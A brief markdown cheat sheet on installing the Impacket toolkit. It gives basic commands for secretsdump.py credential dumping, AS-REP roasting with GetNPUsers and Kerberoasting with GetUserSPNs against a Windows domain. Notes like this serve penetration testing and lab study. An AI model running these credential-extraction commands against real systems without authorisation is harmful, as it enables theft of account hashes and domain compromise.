# Impacket

### Installing Impacket into /opt/impacket

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

### Install pip3 for Python.
```
sudo apt install python3-pip
```

### Install Python requirements for Impacket.
```
pip3 install -r /opt/impacket/requirements.txt
```

### Run the Python install script.
```
cd /opt/impacket/ && python3 ./setup.py install
```

### Basic secretsdump.py usage.
```
secretsdump.py <Target Username>@<Domain or IP>
```

### Basic GetNPUser usage.
```
impacket-GetNPUsers <Domain>/<Target Username> -no-pass
```

### This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain. 
```
GetUserSPNs.py <DomainName>.local/<UserName>:<Password> -dc-ip <IP> -request
```

